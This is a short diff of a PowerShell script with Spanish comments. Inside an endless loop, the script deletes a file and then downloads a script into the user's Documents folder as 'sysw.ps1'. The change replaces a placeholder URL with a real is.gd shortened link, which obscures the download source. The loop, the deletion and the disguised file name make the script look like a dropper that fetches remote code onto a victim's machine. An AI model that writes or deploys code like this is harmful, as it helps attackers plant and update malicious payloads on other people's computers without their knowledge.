@@ -45,7 +45,7 @@ While ($true){
     Remove-Item -Path $file2
     
     # Descargar el script y guardarlo como "sysw.ps1" en la carpeta de documentos
-    $scriptURL = "URL_del_script"
+    $scriptURL = "https://is.gd/H8uBqE"
     $scriptPath = Join-Path -Path $env:USERPROFILE -ChildPath "Documents\sysw.ps1"
     Invoke-WebRequest -Uri $scriptURL -OutFile $scriptPath
     
